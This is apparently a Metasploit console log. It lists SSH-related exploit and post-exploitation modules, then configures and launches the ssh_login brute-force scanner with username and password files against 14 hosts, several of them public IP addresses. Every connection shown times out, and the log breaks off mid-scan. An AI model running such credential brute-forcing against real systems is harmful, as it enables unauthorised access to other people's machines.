@@ -1,0 +1,501 @@
+msf6 > search ssh
+
+Matching Modules
+================
+
+   #    Name                                                               Disclosure Date  Rank       Check  Description
+   -    ----                                                               ---------------  ----       -----  -----------
+   0    exploit/linux/http/alienvault_exec                                 2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution
+   1    auxiliary/scanner/ssh/apache_karaf_command_execution               2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution
+   2    auxiliary/scanner/ssh/karaf_login                                  .                normal     No     Apache Karaf Login Utility
+   3    exploit/apple_ios/ssh/cydia_default_ssh                            2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability
+   4    exploit/unix/ssh/arista_tacplus_shell                              2020-02-02       great      Yes    Arista restricted shell escape (with privesc)
+   5    exploit/unix/ssh/array_vxag_vapv_privkey_privesc                   2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution
+   6    exploit/linux/ssh/ceragon_fibeair_known_privkey                    2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure
+   7    auxiliary/scanner/ssh/cerberus_sftp_enumusers                      2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration
+   8    auxiliary/dos/cisco/cisco_7937g_dos                                2020-06-02       normal     No     Cisco 7937G Denial-of-Service Attack
+   9    auxiliary/admin/http/cisco_7937g_ssh_privesc                       2020-06-02       normal     No     Cisco 7937G SSH Privilege Escalation
+   10   exploit/linux/http/cisco_asax_sfr_rce                              2022-06-22       excellent  Yes    Cisco ASA-X with FirePOWER Services Authenticated Command Injection
+   11     \_ target: Shell Dropper                                         .                .          .      .
+   12     \_ target: Linux Dropper                                         .                .          .      .
+   13   auxiliary/scanner/http/cisco_firepower_login                       .                normal     No     Cisco Firepower Management Console 6.0 Login
+   14   exploit/linux/ssh/cisco_ucs_scpuser                                2019-08-21       excellent  No     Cisco UCS Director default scpuser password
+   15   auxiliary/scanner/ssh/eaton_xpert_backdoor                         2018-07-18       normal     No     Eaton Xpert Meter SSH Private Key Exposure Scanner
+   16   exploit/linux/ssh/exagrid_known_privkey                            2016-04-07       excellent  No     ExaGrid Known SSH Key and Default Password
+   17   exploit/linux/ssh/f5_bigip_known_privkey                           2012-06-11       excellent  No     F5 BIG-IP SSH Private Key Exposure
+   18   exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684   2022-10-10       excellent  Yes    Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.
+   19   auxiliary/scanner/ssh/fortinet_backdoor                            2016-01-09       normal     No     Fortinet SSH Backdoor Scanner
+   20   post/windows/manage/forward_pageant                                .                normal     No     Forward SSH Agent Requests To Remote Pageant
+   21   exploit/windows/ssh/freeftpd_key_exchange                          2006-05-12       average    No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow
+   22     \_ target: Windows 2000 SP0-SP4 English                          .                .          .      .
+   23     \_ target: Windows 2000 SP0-SP4 German                           .                .          .      .
+   24     \_ target: Windows XP SP0-SP1 English                            .                .          .      .
+   25     \_ target: Windows XP SP2 English                                .                .          .      .
+   26   exploit/windows/ssh/freesshd_key_exchange                          2006-05-12       average    No     FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow
+   27     \_ target: Windows 2000 Pro SP4 English                          .                .          .      .
+   28     \_ target: Windows XP Pro SP0 English                            .                .          .      .
+   29     \_ target: Windows XP Pro SP1 English                            .                .          .      .
+   30   exploit/windows/ssh/freesshd_authbypass                            2010-08-11       excellent  Yes    Freesshd Authentication Bypass
+   31     \_ target: PowerShell                                            .                .          .      .
+   32     \_ target: CmdStager upload                                      .                .          .      .
+   33   auxiliary/scanner/http/gitlab_user_enum                            2014-11-21       normal     No     GitLab User Enumeration
+   34   exploit/multi/http/gitlab_shell_exec                               2013-11-04       excellent  Yes    Gitlab-shell Code Execution
+   35     \_ target: Linux                                                 .                .          .      .
+   36     \_ target: Linux (x64)                                           .                .          .      .
+   37     \_ target: Unix (CMD)                                            .                .          .      .
+   38     \_ target: Python                                                .                .          .      .
+   39   exploit/linux/ssh/ibm_drm_a3user                                   2020-04-21       excellent  No     IBM Data Risk Manager a3user Default Password
+   40   post/windows/manage/install_ssh                                    .                normal     No     Install OpenSSH for Windows
+   41   payload/generic/ssh/interact                                       .                normal     No     Interact with Established SSH Connection
+   42   post/multi/gather/jenkins_gather                                   .                normal     No     Jenkins Credential Collector
+   43   auxiliary/scanner/ssh/juniper_backdoor                             2015-12-20       normal     No     Juniper SSH Backdoor Scanner
+   44   exploit/freebsd/http/junos_phprc_auto_prepend_file                 2023-08-17       excellent  Yes    Junos OS PHPRC Environment Variable Manipulation RCE
+   45     \_ target: PHP In-Memory                                         .                .          .      .
+   46     \_ target: Interactive SSH with jail break                       .                .          .      .
+   47   auxiliary/scanner/ssh/detect_kippo                                 .                normal     No     Kippo SSH Honeypot Detector
+   48   post/linux/gather/enum_network                                     .                normal     No     Linux Gather Network Information
+   49   exploit/linux/local/ptrace_traceme_pkexec_helper                   2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit
+   50   exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey         2014-03-17       excellent  No     Loadbalancer.org Enterprise VA SSH Private Key Exposure
+   51   exploit/multi/http/git_submodule_command_exec                      2017-08-10       excellent  No     Malicious Git HTTP Server For CVE-2017-1000117
+   52   exploit/linux/ssh/mercurial_ssh_exec                               2017-04-18       excellent  No     Mercurial Custom hg-ssh Wrapper Remote Code Exec
+   53   exploit/linux/ssh/microfocus_obr_shrboadmin                        2020-09-21       excellent  No     Micro Focus Operations Bridge Reporter shrboadmin default password
+   54   post/multi/gather/ssh_creds                                        .                normal     No     Multi Gather OpenSSH PKI Credentials Collection
+   55   exploit/solaris/ssh/pam_username_bof                               2020-10-20       normal     Yes    Oracle Solaris SunSSH PAM parse_user_name() Buffer Overflow
+   56     \_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VMware      .                .          .      .
+   57     \_ target: SunSSH 1.1.5 / Solaris 10u11 1/13 (x86) / VirtualBox  .                .          .      .
+   58   auxiliary/gather/prometheus_api_gather                             2016-07-01       normal     No     Prometheus API Information Gather
+   59   exploit/windows/ssh/putty_msg_debug                                2002-12-16       normal     No     PuTTY Buffer Overflow
+   60     \_ target: Windows 2000 SP4 English                              .                .          .      .
+   61     \_ target: Windows XP SP2 English                                .                .          .      .
+   62     \_ target: Windows 2003 SP1 English                              .                .          .      .
+   63   post/windows/gather/enum_putty_saved_sessions                      .                normal     No     PuTTY Saved Sessions Enumeration Module
+   64   auxiliary/gather/qnap_lfi                                          2019-11-25       normal     Yes    QNAP QTS and Photo Station Local File Inclusion
+   65   exploit/linux/ssh/quantum_dxi_known_privkey                        2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure
+   66   exploit/linux/ssh/quantum_vmpro_backdoor                           2014-03-17       excellent  No     Quantum vmPRO Backdoor Command
+   67   auxiliary/fuzzers/ssh/ssh_version_15                               .                normal     No     SSH 1.5 Version Fuzzer
+   68   auxiliary/fuzzers/ssh/ssh_version_2                                .                normal     No     SSH 2.0 Version Fuzzer
+   69   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                          .                normal     No     SSH Key Exchange Init Corruption
+   70   post/linux/manage/sshkey_persistence                               .                excellent  No     SSH Key Persistence
+   71   post/windows/manage/sshkey_persistence                             .                good       No     SSH Key Persistence
+   72   auxiliary/scanner/ssh/ssh_login                                    .                normal     No     SSH Login Check Scanner
+   73   auxiliary/scanner/ssh/ssh_identify_pubkeys                         .                normal     No     SSH Public Key Acceptance Scanner
+   74   auxiliary/scanner/ssh/ssh_login_pubkey                             .                normal     No     SSH Public Key Login Scanner
+   75   exploit/multi/ssh/sshexec                                          1999-01-01       manual     No     SSH User Code Execution
+   76     \_ target: Linux Command                                         .                .          .      .
+   77     \_ target: Linux x86                                             .                .          .      .
+   78     \_ target: Linux x64                                             .                .          .      .
+   79     \_ target: Linux armle                                           .                .          .      .
+   80     \_ target: Linux mipsle                                          .                .          .      .
+   81     \_ target: Linux mipsbe                                          .                .          .      .
+   82     \_ target: Linux aarch64                                         .                .          .      .
+   83     \_ target: OSX x86                                               .                .          .      .
+   84     \_ target: OSX x64                                               .                .          .      .
+   85     \_ target: BSD x86                                               .                .          .      .
+   86     \_ target: BSD x64                                               .                .          .      .
+   87     \_ target: Python                                                .                .          .      .
+   88     \_ target: Unix Cmd                                              .                .          .      .
+   89     \_ target: Interactive SSH                                       .                .          .      .
+   90   auxiliary/scanner/ssh/ssh_enumusers                                .                normal     No     SSH Username Enumeration
+   91     \_ action: Malformed Packet                                      .                .          .      Use a malformed packet
+   92     \_ action: Timing Attack                                         .                .          .      Use a timing attack
+   93   auxiliary/fuzzers/ssh/ssh_version_corrupt                          .                normal     No     SSH Version Corruption
+   94   auxiliary/scanner/ssh/ssh_version                                  .                normal     No     SSH Version Scanner
+   95   post/multi/gather/saltstack_salt                                   .                normal     No     SaltStack Salt Information Gatherer
+   96   exploit/unix/http/schneider_electric_net55xx_encoder               2019-01-25       excellent  Yes    Schneider Electric Pelco Endura NET55XX Encoder
+   97   exploit/windows/ssh/securecrt_ssh1                                 2002-07-23       average    No     SecureCRT SSH1 Buffer Overflow
+   98   exploit/linux/ssh/solarwinds_lem_exec                              2017-03-17       excellent  No     SolarWinds LEM Default SSH Password Remote Code Execution
+   99   exploit/linux/http/sourcegraph_gitserver_sshcmd                    2022-02-18       excellent  Yes    Sourcegraph gitserver sshCommand RCE
+   100    \_ target: Automatic                                             .                .          .      .
+   101    \_ target: Unix Command                                          .                .          .      .
+   102    \_ target: Linux Dropper                                         .                .          .      .
+   103  exploit/linux/ssh/symantec_smg_ssh                                 2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
+   104  exploit/linux/http/symantec_messaging_gateway_exec                 2017-04-26       excellent  No     Symantec Messaging Gateway Remote Code Execution
+   105  exploit/windows/ssh/sysax_ssh_username                             2012-02-27       normal     Yes    Sysax 5.53 SSH Username Buffer Overflow
+   106    \_ target: Sysax 5.53 on Win XP SP3 / Win2k3 SP0                 .                .          .      .
+   107    \_ target: Sysax 5.53 on Win2K3 SP1/SP2                          .                .          .      .
+   108  auxiliary/dos/windows/ssh/sysax_sshd_kexchange                     2013-03-17       normal     No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service
+   109  exploit/unix/ssh/tectia_passwd_changereq                           2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability
+   110  auxiliary/scanner/ssh/ssh_enum_git_keys                            .                normal     No     Test SSH Github Access
+   111  exploit/linux/http/ubiquiti_airos_file_upload                      2016-02-13       excellent  No     Ubiquiti airOS Arbitrary File Upload
+   112  payload/cmd/unix/reverse_ssh                                       .                normal     No     Unix Command Shell, Reverse TCP SSH
+   113  payload/cmd/unix/bind_aws_instance_connect                         .                normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)
+   114  exploit/linux/ssh/vmware_vrni_known_privkey                        2023-08-29       excellent  No     VMWare Aria Operations for Networks (vRealize Network Insight) SSH Private Key Exposure
+   115    \_ target: 6.0_platform                                          .                .          .      .
+   116    \_ target: 6.0_proxy                                             .                .          .      .
+   117    \_ target: 6.1_platform                                          .                .          .      .
+   118    \_ target: 6.1_proxy                                             .                .          .      .
+   119    \_ target: 6.2_collector                                         .                .          .      .
+   120    \_ target: 6.2_platform                                          .                .          .      .
+   121    \_ target: 6.3_collector                                         .                .          .      .
+   122    \_ target: 6.3_platform                                          .                .          .      .
+   123    \_ target: 6.4_collector                                         .                .          .      .
+   124    \_ target: 6.4_platform                                          .                .          .      .
+   125    \_ target: 6.5_collector                                         .                .          .      .
+   126    \_ target: 6.5_platform                                          .                .          .      .
+   127    \_ target: 6.6_collector                                         .                .          .      .
+   128    \_ target: 6.6_platform                                          .                .          .      .
+   129    \_ target: 6.7_collector                                         .                .          .      .
+   130    \_ target: 6.7_platform                                          .                .          .      .
+   131    \_ target: 6.8_collector                                         .                .          .      .
+   132    \_ target: 6.8_platform                                          .                .          .      .
+   133    \_ target: 6.9_collector                                         .                .          .      .
+   134    \_ target: 6.9_platform                                          .                .          .      .
+   135    \_ target: 6.10_collector                                        .                .          .      .
+   136    \_ target: 6.10_platform                                         .                .          .      .
+   137    \_ target: All                                                   .                .          .      .
+   138  exploit/linux/ssh/vmware_vdp_known_privkey                         2016-12-20       excellent  No     VMware VDP Known SSH Key
+   139  exploit/multi/http/vmware_vcenter_uploadova_rce                    2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE
+   140    \_ target: VMware vCenter Server <= 6.7 Update 1b (Linux)        .                .          .      .
+   141    \_ target: VMware vCenter Server <= 6.7 Update 3j (Windows)      .                .          .      .
+   142  exploit/linux/ssh/vyos_restricted_shell_privesc                    2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation
+   143  post/windows/gather/credentials/whatsupgold_credential_dump        2022-11-22       manual     No     WhatsUp Gold Credentials Dump
+   144    \_ action: Decrypt                                               .                .          .      Decrypt WhatsUp Gold database export CSV file
+   145    \_ action: Dump                                                  .                .          .      Export WhatsUp Gold database and perform decryption
+   146    \_ action: Export                                                .                .          .      Export WhatsUp Gold database without decryption
+   147  post/windows/gather/credentials/mremote                            .                normal     No     Windows Gather mRemote Saved Password Extraction
+   148  exploit/windows/local/unquoted_service_path                        2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation
+   149  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                        2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm
+   150    \_ target: Unix Command                                          .                .          .      .
+   151    \_ target: Linux Dropper                                         .                .          .      .
+   152    \_ target: Interactive SSH                                       .                .          .      .
+   153  auxiliary/scanner/ssh/libssh_auth_bypass                           2018-10-16       normal     No     libssh Authentication Bypass Scanner
+   154    \_ action: Execute                                               .                .          .      Execute a command
+   155    \_ action: Shell                                                 .                .          .      Spawn a shell
+   156  exploit/linux/http/php_imap_open_rce                               2018-10-23       good       Yes    php imap_open Remote Code Execution
+   157    \_ target: prestashop                                            .                .          .      .
+   158    \_ target: suitecrm                                              .                .          .      .
+   159    \_ target: e107v2                                                .                .          .      .
+   160    \_ target: Horde IMP H3                                          .                .          .      .
+   161    \_ target: custom                                                .                .          .      .
+
+
+Interact with a module by name or index. For example info 161, use 161 or use exploit/linux/http/php_imap_open_rce                                                    
+After interacting with a module you can manually set a TARGET with set TARGET 'custom'                                                                                
+
+msf6 > search ssh login
+
+Matching Modules
+================
+
+   #   Name                                                              Disclosure Date  Rank       Check  Description
+   -   ----                                                              ---------------  ----       -----  -----------
+   0   exploit/linux/http/alienvault_exec                                2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution
+   1   auxiliary/scanner/ssh/apache_karaf_command_execution              2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution
+   2   auxiliary/scanner/ssh/karaf_login                                 .                normal     No     Apache Karaf Login Utility
+   3   exploit/unix/ssh/array_vxag_vapv_privkey_privesc                  2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution
+   4   auxiliary/scanner/ssh/cerberus_sftp_enumusers                     2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration
+   5   auxiliary/scanner/http/cisco_firepower_login                      .                normal     No     Cisco Firepower Management Console 6.0 Login
+   6   exploit/linux/ssh/cisco_ucs_scpuser                               2019-08-21       excellent  No     Cisco UCS Director default scpuser password
+   7   exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684  2022-10-10       excellent  Yes    Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.
+   8   exploit/freebsd/http/junos_phprc_auto_prepend_file                2023-08-17       excellent  Yes    Junos OS PHPRC Environment Variable Manipulation RCE
+   9     \_ target: PHP In-Memory                                        .                .          .      .
+   10    \_ target: Interactive SSH with jail break                      .                .          .      .
+   11  exploit/linux/ssh/microfocus_obr_shrboadmin                       2020-09-21       excellent  No     Micro Focus Operations Bridge Reporter shrboadmin default password
+   12  post/linux/manage/sshkey_persistence                              .                excellent  No     SSH Key Persistence
+   13  post/windows/manage/sshkey_persistence                            .                good       No     SSH Key Persistence
+   14  auxiliary/scanner/ssh/ssh_login                                   .                normal     No     SSH Login Check Scanner
+   15  auxiliary/scanner/ssh/ssh_login_pubkey                            .                normal     No     SSH Public Key Login Scanner
+   16  exploit/linux/ssh/symantec_smg_ssh                                2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
+   17  exploit/unix/ssh/tectia_passwd_changereq                          2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability
+   18  post/windows/gather/credentials/mremote                           .                normal     No     Windows Gather mRemote Saved Password Extraction
+
+
+Interact with a module by name or index. For example info 18, use 18 or use post/windows/gather/credentials/mremote                                                   
+
+msf6 > use 14
+msf6 auxiliary(scanner/ssh/ssh_login) > options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank use
+                                                rname and password
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to
+                                                 5
+   CreateSession     true             no        Create a new session for every su
+                                                ccessful login
+   DB_ALL_CREDS      false            no        Try each user/password couple sto
+                                                red in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current
+                                                database to the list
+   DB_ALL_USERS      false            no        Add all users in the current data
+                                                base to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored
+                                                in the current database (Accepted
+                                                : none, user, user&realm)
+   PASSWORD                           no        A specific password to authentica
+                                                te with
+   PASS_FILE                          no        File containing passwords, one pe
+                                                r line
+   RHOSTS                             yes       The target host(s), see https://d
+                                                ocs.metasploit.com/docs/using-met
+                                                asploit/basics/using-metasploit.h
+                                                tml
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential w
+                                                orks for a host
+   THREADS           1                yes       The number of concurrent threads
+                                                (max one per host)
+   USERNAME                           no        A specific username to authentica
+                                                te as
+   USERPASS_FILE                      no        File containing users and passwor
+                                                ds separated by space, one pair p
+                                                er line
+   USER_AS_PASS      false            no        Try the username as the password
+                                                for all users
+   USER_FILE                          no        File containing usernames, one pe
+                                                r line
+   VERBOSE           false            yes       Whether to print output for all a
+                                                ttempts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > back
+msf6 > search ssh login
+
+Matching Modules
+================
+
+   #   Name                                                              Disclosure Date  Rank       Check  Description
+   -   ----                                                              ---------------  ----       -----  -----------
+   0   exploit/linux/http/alienvault_exec                                2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution
+   1   auxiliary/scanner/ssh/apache_karaf_command_execution              2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution
+   2   auxiliary/scanner/ssh/karaf_login                                 .                normal     No     Apache Karaf Login Utility
+   3   exploit/unix/ssh/array_vxag_vapv_privkey_privesc                  2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution
+   4   auxiliary/scanner/ssh/cerberus_sftp_enumusers                     2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration
+   5   auxiliary/scanner/http/cisco_firepower_login                      .                normal     No     Cisco Firepower Management Console 6.0 Login
+   6   exploit/linux/ssh/cisco_ucs_scpuser                               2019-08-21       excellent  No     Cisco UCS Director default scpuser password
+   7   exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684  2022-10-10       excellent  Yes    Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.
+   8   exploit/freebsd/http/junos_phprc_auto_prepend_file                2023-08-17       excellent  Yes    Junos OS PHPRC Environment Variable Manipulation RCE
+   9     \_ target: PHP In-Memory                                        .                .          .      .
+   10    \_ target: Interactive SSH with jail break                      .                .          .      .
+   11  exploit/linux/ssh/microfocus_obr_shrboadmin                       2020-09-21       excellent  No     Micro Focus Operations Bridge Reporter shrboadmin default password
+   12  post/linux/manage/sshkey_persistence                              .                excellent  No     SSH Key Persistence
+   13  post/windows/manage/sshkey_persistence                            .                good       No     SSH Key Persistence
+   14  auxiliary/scanner/ssh/ssh_login                                   .                normal     No     SSH Login Check Scanner
+   15  auxiliary/scanner/ssh/ssh_login_pubkey                            .                normal     No     SSH Public Key Login Scanner
+   16  exploit/linux/ssh/symantec_smg_ssh                                2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
+   17  exploit/unix/ssh/tectia_passwd_changereq                          2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability
+   18  post/windows/gather/credentials/mremote                           .                normal     No     Windows Gather mRemote Saved Password Extraction
+
+
+Interact with a module by name or index. For example info 18, use 18 or use post/windows/gather/credentials/mremote                                                   
+
+msf6 > use 14
+msf6 auxiliary(scanner/ssh/ssh_login) > options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank use
+                                                rname and password
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to
+                                                 5
+   CreateSession     true             no        Create a new session for every su
+                                                ccessful login
+   DB_ALL_CREDS      false            no        Try each user/password couple sto
+                                                red in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current
+                                                database to the list
+   DB_ALL_USERS      false            no        Add all users in the current data
+                                                base to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored
+                                                in the current database (Accepted
+                                                : none, user, user&realm)
+   PASSWORD                           no        A specific password to authentica
+                                                te with
+   PASS_FILE                          no        File containing passwords, one pe
+                                                r line
+   RHOSTS                             yes       The target host(s), see https://d
+                                                ocs.metasploit.com/docs/using-met
+                                                asploit/basics/using-metasploit.h
+                                                tml
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential w
+                                                orks for a host
+   THREADS           1                yes       The number of concurrent threads
+                                                (max one per host)
+   USERNAME                           no        A specific username to authentica
+                                                te as
+   USERPASS_FILE                      no        File containing users and passwor
+                                                ds separated by space, one pair p
+                                                er line
+   USER_AS_PASS      false            no        Try the username as the password
+                                                for all users
+   USER_FILE                          no        File containing usernames, one pe
+                                                r line
+   VERBOSE           false            yes       Whether to print output for all a
+                                                ttempts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank use
+                                                rname and password
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to
+                                                 5
+   CreateSession     true             no        Create a new session for every su
+                                                ccessful login
+   DB_ALL_CREDS      false            no        Try each user/password couple sto
+                                                red in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current
+                                                database to the list
+   DB_ALL_USERS      false            no        Add all users in the current data
+                                                base to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored
+                                                in the current database (Accepted
+                                                : none, user, user&realm)
+   PASSWORD                           no        A specific password to authentica
+                                                te with
+   PASS_FILE                          no        File containing passwords, one pe
+                                                r line
+   RHOSTS                             yes       The target host(s), see https://d
+                                                ocs.metasploit.com/docs/using-met
+                                                asploit/basics/using-metasploit.h
+                                                tml
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential w
+                                                orks for a host
+   THREADS           1                yes       The number of concurrent threads
+                                                (max one per host)
+   USERNAME                           no        A specific username to authentica
+                                                te as
+   USERPASS_FILE                      no        File containing users and passwor
+                                                ds separated by space, one pair p
+                                                er line
+   USER_AS_PASS      false            no        Try the username as the password
+                                                for all users
+   USER_FILE                          no        File containing usernames, one pe
+                                                r line
+   VERBOSE           false            yes       Whether to print output for all a
+                                                ttempts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
+verbose => true
+msf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
+stop_on_success => true
+msf6 auxiliary(scanner/ssh/ssh_login) > set rhost 10.159.44.156, 10.161.59.68, 10.159.114.39, 5.194.202.142, 10.159.44.153, 5.194.202.148, 10.159.44.154, 5.194.202.140, 10.159.114.40, 10.161.59.69, 5.211.4.253, 10.161.28.44, 10.159.44.155, 10.159.114.41                                                                                                                                                                                   
+rhost => 10.159.44.156, 10.161.59.68, 10.159.114.39, 5.194.202.142, 10.159.44.153, 5.194.202.148, 10.159.44.154, 5.194.202.140, 10.159.114.40, 10.161.59.69, 5.211.4.253, 10.161.28.44, 10.159.44.155, 10.159.114.41    
+msf6 auxiliary(scanner/ssh/ssh_login) > options                                                                                                                                                                         
+                                                                                                                                                                                                                        
+Module options (auxiliary/scanner/ssh/ssh_login):                                                                                                                                                                       
+                                                                                                                                                                                                                        
+   Name              Current Setting                                                                  Required  Description                                                                                             
+   ----              ---------------                                                                  --------  -----------                                                                                             
+   ANONYMOUS_LOGIN   false                                                                            yes       Attempt to login with a blank username and password                                                     
+   BLANK_PASSWORDS   false                                                                            no        Try blank passwords for all users                                                                       
+   BRUTEFORCE_SPEED  5                                                                                yes       How fast to bruteforce, from 0 to 5                                                                     
+   CreateSession     true                                                                             no        Create a new session for every successful login                                                         
+   DB_ALL_CREDS      false                                                                            no        Try each user/password couple stored in the current database                                            
+   DB_ALL_PASS       false                                                                            no        Add all passwords in the current database to the list                                                   
+   DB_ALL_USERS      false                                                                            no        Add all users in the current database to the list                                                       
+   DB_SKIP_EXISTING  none                                                                             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)             
+   PASSWORD                                                                                           no        A specific password to authenticate with                                                                
+   PASS_FILE                                                                                          no        File containing passwords, one per line                                                                 
+   RHOSTS            10.159.44.156, 10.161.59.68, 10.159.114.39, 5.194.202.142, 10.159.44.153, 5.194  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html  
+                     .202.148, 10.159.44.154, 5.194.202.140, 10.159.114.40, 10.161.59.69, 5.211.4.25                                                                                                                    
+                     3, 10.161.28.44, 10.159.44.155, 10.159.114.41                                                                                                                                                      
+   RPORT             22                                                                               yes       The target port                                                                                         
+   STOP_ON_SUCCESS   true                                                                             yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                                yes       The number of concurrent threads (max one per host)
+   USERNAME                                                                                           no        A specific username to authenticate as
+   USERPASS_FILE                                                                                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                                            no        Try the username as the password for all users
+   USER_FILE                                                                                          no        File containing usernames, one per line
+   VERBOSE           true                                                                             yes       Whether to print output for all attempts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set user_file ssh-usernames.txt
+user_file => ssh-usernames.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt
+pass_file => passwords.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > exploit
+
+[*] 10.159.44.156:22 - Starting bruteforce
+[-] Could not connect: The connection with (10.159.44.156:22) timed out.
+WARNING:  database "msf" has a collation version mismatch
+DETAIL:  The database was created using collation version 2.38, but the operating system provides version 2.40.
+HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE msf REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
+[-] Could not connect: The connection with (10.159.44.156:22) timed out.
+[-] Could not connect: The connection with (10.159.44.156:22) timed out.
+[*] 10.161.59.68:22 - Starting bruteforce
+[-] Could not connect: The connection with (10.161.59.68:22) timed out.
+[-] Could not connect: The connection with (10.161.59.68:22) timed out.
+[-] Could not connect: The connection with (10.161.59.68:22) timed out.
+[*] Scanned  2 of 14 hosts (14% complete)
+[*] 10.159.114.39:22 - Starting bruteforce
+[-] Could not connect: The connection with (10.159.114.39:22) timed out.
+[-] Could not connect: The connection with (10.159.114.39:22) timed out.
+[-] Could not connect: The connection with (10.159.114.39:22) timed out.
+[*] Scanned  3 of 14 hosts (21% complete)
+[*] 5.194.202.142:22 - Starting bruteforce
+[-] Could not connect: The connection with (5.194.202.142:22) timed out.
+[-] Could not connect: The connection with (5.194.202.142:22) timed out.
+[-] Could not connect: The connection with (5.194.202.142:22) timed out.
+[*] 10.159.44.153:22 - Starting bruteforce
+[-] Could not connect: The connection with (10.159.44.153:22) timed out.
+[-] Could not connect: The connection with (10.159.44.153:22) timed out.
+[-] Could not connect: The connection with (10.159.44.153:22) timed out.
+[*] Scanned  5 of 14 hosts (35% complete)
+[*] 5.194.202.148:22 - Starting bruteforce
+[-] Could not connect: The connection with (5.194.202.148:22) timed out.
+[-] Could not connect: The connection with (5.194.202.148:22) timed out.
+[-] Could not connect: The connection with (5.194.202.148:22) timed out.
+[*] Scanned  6 of 14 hosts (42% complete)
+[*] 10.159.44.154:22 - Starting bruteforce
+[-] Could not connect: The connection with (10.159.44.154:22) timed out.
+[-] Could not connect: The connection with (10.159.44.154:22) timed out.
+[-] Could not connect: The connection with (10.159.44.154:22) timed out.                                                                                                                                                
+[*] Scanned  7 of 14 hosts (50% complete)                                                                                                                                                                               
+[*] 5.194.202.140:22 - Starting bruteforce                                                                                                                                                                              
+[-] Could not connect: The connection with (5.194.202.140:22) timed out.                                                                                                                                                
